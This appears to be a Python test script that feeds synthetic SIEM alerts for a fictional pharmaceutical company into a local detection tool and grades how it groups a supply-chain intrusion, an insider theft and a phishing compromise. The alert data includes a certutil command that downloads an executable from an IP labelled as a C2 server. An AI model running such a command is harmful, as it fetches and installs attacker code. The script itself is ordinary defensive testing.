"""NexaGen Pharmaceuticals — 7-Day Security Pilot Simulation.

A COMPLETELY DIFFERENT company from Meridian Capital to test whether
Vigilis can handle varied data structures, attack patterns, and user behaviors.

Company profile:
- NexaGen Pharmaceuticals (500 employees, biotech/pharma)
- Mixed cloud + on-prem (Azure AD + legacy Windows AD)
- Research labs with IP-sensitive data
- Regulatory compliance (HIPAA, FDA 21 CFR Part 11)

Attack scenarios:
1. SUPPLY CHAIN COMPROMISE (Days 1-4): Attacker compromises a vendor portal
   account, pivots to internal R&D systems, exfiltrates drug trial data.
2. DISGRUNTLED RESEARCHER (Days 2-6): Dr. Chen, recently passed over for
   promotion, systematically copies proprietary formulas to personal storage.
3. CREDENTIAL PHISHING (Days 4-5): HR impersonation phishing campaign
   targeting finance team, one victim (t.rodriguez) compromised.

Noise:
- Daily VPN logins from remote workers
- Automated lab equipment polling
- IT service desk account doing routine password resets
"""
import json
import time
import httpx
from datetime import datetime, timedelta

BASE_URL = "http://localhost:8000"
AK = "socai-demo-key-do-not-use-in-production"
HEADERS = {"X-API-Key": AK}

# Real known-bad IPs for threat intel hits
ATTACKER_IPS = {
    "vendor_compromise": "185.220.101.45",   # Known Tor exit (OTX: 50 pulses)
    "c2_server": "94.102.49.190",            # Known C2 (OTX: 50 pulses)
    "phishing_infra": "23.129.64.100",       # Tor exit node range
    "researcher_exfil": "162.125.1.1",       # Dropbox (legitimate but exfil target)
}

# Legitimate infrastructure
CORP_VPN = "198.51.100.10"  # Corporate VPN concentrator (RFC 5737 — TEST-NET)
LAB_SUBNET = "10.200."     # Research lab network


def generate_day(day_num: int) -> list[dict]:
    """Generate alerts for a single day of NexaGen's pilot."""
    base_date = datetime(2026, 4, day_num, 0, 0, 0)
    alerts = []

    def ts(hour, minute=0):
        return (base_date + timedelta(hours=hour, minutes=minute)).strftime("%Y-%m-%dT%H:%M:%SZ")

    def alert(etype, user, ip, sev, host, hour, minute=0, extra=None):
        """Create an alert in a DIFFERENT format from Meridian — Splunk-style flat fields."""
        a = {
            "timestamp": ts(hour, minute),
            "event_type": etype,
            "user": user,
            "src_ip": ip,
            "severity": sev,
            "hostname": host,
            "source": "NexaGen-SIEM",
        }
        if extra:
            a.update(extra)
        alerts.append(a)

    # ====== DAILY NOISE (every day) ======
    # Remote workers VPN login
    for i, user in enumerate(["a.johnson@nexagen.com", "b.williams@nexagen.com",
                               "c.martinez@nexagen.com", "d.thompson@nexagen.com"]):
        alert("login_success", user, f"73.{150+i}.{20+day_num}.{100+i}", "LOW",
              f"VPN-GW-01", 8 + (i % 3), 15 + i * 5,
              {"action": "success", "description": f"Standard VPN login from home office",
               "geo": "US", "auth_method": "MFA"})

    # Lab equipment automated polling
    alert("login_success", "svc-labcontrol@nexagen.com", "10.200.1.5", "LOW",
          "LAB-CTRL-01", 0, 0,
          {"action": "success", "description": "Automated lab instrument polling cycle"})

    # IT helpdesk routine (should score LOW)
    if day_num % 2 == 0:
        alert("suspicious_process", "helpdesk-admin@nexagen.com", "10.10.0.50", "LOW",
              "ITSM-01", 9, 30,
              {"action": "process_start", "process_name": "powershell.exe",
               "description": f"Routine AD password reset script — ServiceNow ticket INC{7700 + day_num}",
               "command_line": "powershell.exe -File Reset-ExpiredPasswords.ps1"})

    # ====== SUPPLY CHAIN COMPROMISE (Days 1-4) ======
    if day_num == 1:
        # Day 1: Vendor portal brute force from Tor
        for vendor_user in ["vendor-api@nexagen.com", "vendor-sync@nexagen.com"]:
            alert("suspicious_signin", vendor_user, ATTACKER_IPS["vendor_compromise"], "HIGH",
                  "VENDOR-PORTAL-01", 2, 15,
                  {"geo": "DE", "action": "failed",
                   "description": "Multiple failed logins from Tor exit node to vendor portal"})
        # Successful compromise
        alert("suspicious_signin", "vendor-api@nexagen.com", ATTACKER_IPS["vendor_compromise"],
              "CRITICAL", "VENDOR-PORTAL-01", 2, 45,
              {"geo": "DE", "action": "success",
               "description": "Successful login after brute force — vendor-api account compromised"})

    if day_num == 2:
        # Day 2: Lateral movement from vendor portal to R&D
        alert("suspicious_signin", "vendor-api@nexagen.com", ATTACKER_IPS["c2_server"],
              "CRITICAL", "RD-FILESERVER-01", 3, 10,
              {"geo": "GB", "action": "success",
               "description": "Vendor account accessing R&D file server from non-vendor IP"})
        alert("suspicious_process", "vendor-api@nexagen.com", ATTACKER_IPS["c2_server"],
              "CRITICAL", "RD-FILESERVER-01", 3, 25,
              {"action": "execute", "process_name": "certutil.exe",
               "command_line": "certutil -urlcache -f http://94.102.49.190/beacon.exe C:\\temp\\svc.exe",
               "description": "Living-off-the-land binary used to download payload"})

    if day_num == 3:
        # Day 3: Persistence + privilege escalation
        alert("CreateAccessKey", "vendor-api@nexagen.com", ATTACKER_IPS["c2_server"],
              "CRITICAL", "AZURE-AD-01", 1, 45,
              {"action": "create_key",
               "description": "New service principal created from suspicious IP"})
        alert("privilege_escalation", "vendor-api@nexagen.com", ATTACKER_IPS["c2_server"],
              "CRITICAL", "RD-FILESERVER-01", 2, 0,
              {"action": "role_change",
               "description": "Vendor account elevated to Research Data Admin role"})

    if day_num == 4:
        # Day 4: Data exfiltration of drug trial data
        alert("data_exfiltration", "vendor-api@nexagen.com", ATTACKER_IPS["c2_server"],
              "CRITICAL", "RD-FILESERVER-01", 4, 0,
              {"action": "exfil", "bytes": "104857600",
               "dst_ip": ATTACKER_IPS["c2_server"],
               "description": "100MB of Phase III trial data exfiltrated to C2 server"})

    # ====== DISGRUNTLED RESEARCHER: dr.chen (Days 2-6) ======
    if day_num >= 2 and day_num <= 6:
        # After-hours lab access
        alert("suspicious_signin", "dr.chen@nexagen.com", "10.200.5.22", "MEDIUM",
              "LAB-WS-07", 22, 30 + day_num,
              {"action": "success", "geo": "US",
               "description": f"After-hours badge-in to Lab 3 — night {day_num - 1}"})

    if day_num >= 3 and day_num <= 6:
        # Copying formulas to personal USB
        alert("process_execution", "dr.chen@nexagen.com", "10.200.5.22", "HIGH",
              "LAB-WS-07", 22, 45 + day_num,
              {"action": "execute", "process_name": "7z.exe",
               "command_line": f"7z a -p formulas_batch_{day_num}.7z D:\\Research\\Proprietary\\",
               "description": f"Compressing proprietary research files — night {day_num - 1}"})

    if day_num >= 4 and day_num <= 6:
        # Uploading to personal cloud
        size = 50 * (day_num - 3)  # Escalating: 50MB, 100MB, 150MB
        alert("large_data_transfer", "dr.chen@nexagen.com", "10.200.5.22", "CRITICAL",
              "LAB-WS-07", 23, day_num,
              {"action": "upload", "bytes": str(size * 1048576),
               "dst_ip": ATTACKER_IPS["researcher_exfil"],
               "description": f"Night {day_num - 1}: {size}MB upload to personal Dropbox"})

    if day_num == 6:
        # DLP alert on cumulative threshold
        alert("data_exfiltration", "dr.chen@nexagen.com", "10.200.5.22", "CRITICAL",
              "DLP-SENSOR-01", 23, 30,
              {"action": "exfil",
               "description": "DLP: Cumulative exfiltration threshold exceeded — 300MB total to external cloud"})

    # ====== PHISHING CAMPAIGN (Days 4-5) ======
    if day_num == 4:
        # Phishing emails targeting finance
        for user in ["t.rodriguez@nexagen.com", "s.patel@nexagen.com", "j.kim@nexagen.com"]:
            alert("phishing_detected", user, ATTACKER_IPS["phishing_infra"], "HIGH",
                  "MAIL-GW-01", 10, 0,
                  {"action": "detected",
                   "sender": "hr-benefits@nexag3n-corp.co",
                   "description": "HR impersonation phishing — fake benefits enrollment link"})

    if day_num == 5:
        # t.rodriguez clicks link, gets compromised
        alert("suspicious_signin", "t.rodriguez@nexagen.com", ATTACKER_IPS["phishing_infra"],
              "CRITICAL", "AAD-01", 10, 30,
              {"geo": "RU", "action": "success",
               "description": "Login from Russia after phishing link click"})
        # Attacker sets up email forwarding
        alert("email_forwarding_rule", "t.rodriguez@nexagen.com", ATTACKER_IPS["phishing_infra"],
              "CRITICAL", "EXO-01", 11, 0,
              {"action": "rule_created",
               "forwarding_address": "finance-audit@protonmail.com",
               "description": "Forwarding all finance emails to external address"})

    return alerts


def upload_day(day_num: int, alerts: list[dict]) -> dict:
    """Upload one day's alerts and return the result."""
    content = json.dumps(alerts)
    with httpx.Client(timeout=120) as client:
        resp = client.post(
            f"{BASE_URL}/api/v1/demo/upload",
            params={"grouping": "true", "persist": "true"},
            headers=HEADERS,
            files={"file": (f"nexagen_day_{day_num}.json", content.encode(), "application/json")},
        )
        return resp.json()


def get_incidents() -> list[dict]:
    with httpx.Client(timeout=30) as client:
        resp = client.get(f"{BASE_URL}/api/v1/incidents", headers=HEADERS)
        return resp.json()


def get_cases() -> list[dict]:
    with httpx.Client(timeout=30) as client:
        resp = client.get(f"{BASE_URL}/api/v1/cases", params={"limit": 100}, headers=HEADERS)
        return resp.json()


def run_pilot():
    print("=" * 60)
    print("NEXAGEN PHARMACEUTICALS — 7-DAY PILOT SIMULATION")
    print("=" * 60)
    print("Testing: Splunk-style flat field format (not UDM nested)")
    print("Attacks: Supply chain, insider researcher, credential phishing")
    print()

    # Reset
    with httpx.Client(timeout=30) as client:
        client.post(f"{BASE_URL}/api/v1/demo/reset", headers=HEADERS)
    print("Database reset. Starting pilot...\n")

    total_alerts = 0

    for day in range(1, 8):
        alerts = generate_day(day)
        total_alerts += len(alerts)

        result = upload_day(day, alerts)
        cases_today = result.get("caseCount", "?")

        time.sleep(4)  # Wait for auto-correlation

        incidents = get_incidents()
        cases = get_cases()

        # Alert type distribution
        at_dist = result.get("alertTypeDistribution", {})

        print(f"Day {day}: {len(alerts):3d} alerts -> {cases_today} cases | "
              f"Total cases: {len(cases)} | Incidents: {len(incidents)}")
        if at_dist:
            print(f"       Types: {at_dist}")
        for inc in incidents:
            if isinstance(inc, dict):
                title = "".join(c if ord(c) < 128 else "?" for c in inc.get("title", "?"))
                nc = inc.get("caseCount", "?")
                sev = inc.get("severity", "?")
                print(f"       [{sev}] {title} ({nc} cases)")
        print()

    # ── Final analysis ──────────────────────────────────────────────
    print("=" * 60)
    print("FINAL NEXAGEN PILOT REPORT")
    print("=" * 60)

    incidents = get_incidents()
    cases = get_cases()

    print(f"\nTotal alerts ingested: {total_alerts}")
    print(f"Total cases: {len(cases)}")
    print(f"Total incidents: {len(incidents)}")

    # Grade each attack thread
    vendor_incs = [i for i in incidents if isinstance(i, dict) and "vendor" in str(i).lower()]
    chen_incs = [i for i in incidents if isinstance(i, dict) and "chen" in str(i).lower()]
    phishing_incs = [i for i in incidents if isinstance(i, dict) and
                     ("rodriguez" in str(i).lower() or "phish" in str(i).lower())]

    print(f"\nATTACK THREAD GRADING:")
    print(f"  Supply chain (vendor-api): {len(vendor_incs)} incident(s) — "
          f"{'PASS' if len(vendor_incs) == 1 else f'CHECK ({len(vendor_incs)})'}")
    print(f"  Insider (dr.chen):         {len(chen_incs)} incident(s) — "
          f"{'PASS' if len(chen_incs) == 1 else f'CHECK ({len(chen_incs)})'}")
    print(f"  Phishing (t.rodriguez):    {len(phishing_incs)} incident(s) — "
          f"{'PASS' if len(phishing_incs) >= 1 else f'CHECK ({len(phishing_incs)})'}")

    # Noise check
    noise_users = ["a.johnson", "b.williams", "c.martinez", "d.thompson",
                   "svc-labcontrol", "helpdesk-admin"]
    noise_cases = [c for c in cases if isinstance(c, dict) and
                   any(n in str(c.get("entities", {})).lower() for n in noise_users)]
    noise_scores = [c.get("confidence", {}).get("score", 0) for c in noise_cases
                    if isinstance(c.get("confidence"), dict)]
    noise_in_incidents = [i for i in incidents if
                          any(n in str(i).lower() for n in noise_users)]

    avg_noise = sum(noise_scores) / max(len(noise_scores), 1)
    print(f"\n  Noise suppression:")
    print(f"    Noise cases: {len(noise_cases)}, avg score: {avg_noise:.0f}")
    print(f"    Noise in incidents: {len(noise_in_incidents)} — "
          f"{'PASS' if len(noise_in_incidents) == 0 else 'FAIL'}")

    # Score ranges for attack users
    print(f"\n  Score ranges:")
    for target_user in ["vendor-api", "dr.chen", "t.rodriguez"]:
        user_cases = [c for c in cases if isinstance(c, dict) and
                      target_user in str(c.get("entities", {})).lower()]
        scores = [c.get("confidence", {}).get("score", 0) for c in user_cases
                  if isinstance(c.get("confidence"), dict)]
        if scores:
            print(f"    {target_user:20s}: {len(user_cases)} cases, "
                  f"scores {min(scores)}-{max(scores)}")

    # Show all cases (attack users only)
    print(f"\n  All attack cases:")
    for c in cases:
        if isinstance(c, dict):
            ent = c.get("entities", {})
            ident = ent.get("identity", {}) if isinstance(ent, dict) else {}
            upn = ident.get("upn", "?") if isinstance(ident, dict) else "?"
            if any(u in upn.lower() for u in ["vendor", "chen", "rodriguez",
                                               "patel", "kim"]):
                at = c.get("alertType", "?")
                score = c.get("confidence", {}).get("score", "?") if isinstance(c.get("confidence"), dict) else "?"
                et = str(c.get("timestamps", {}).get("eventTime", ""))[:16]
                print(f"    {upn:35s} {at:35s} score={score:>3} time={et}")

    # Overall
    total_attack = len(vendor_incs) + len(chen_incs) + len(phishing_incs)
    expected = 3
    print(f"\n  OVERALL: {total_attack} attack incidents (expected {expected})")
    if total_attack == expected and len(noise_in_incidents) == 0:
        print("  GRADE: A — All attacks detected, noise suppressed")
    elif total_attack >= 2 and len(noise_in_incidents) == 0:
        print("  GRADE: B — Good detection, minor gaps")
    elif len(noise_in_incidents) == 0:
        print(f"  GRADE: C — {total_attack}/{expected} attacks detected")
    else:
        print(f"  GRADE: D — {total_attack} attacks, {len(noise_in_incidents)} noise incidents")


if __name__ == "__main__":
    run_pilot()
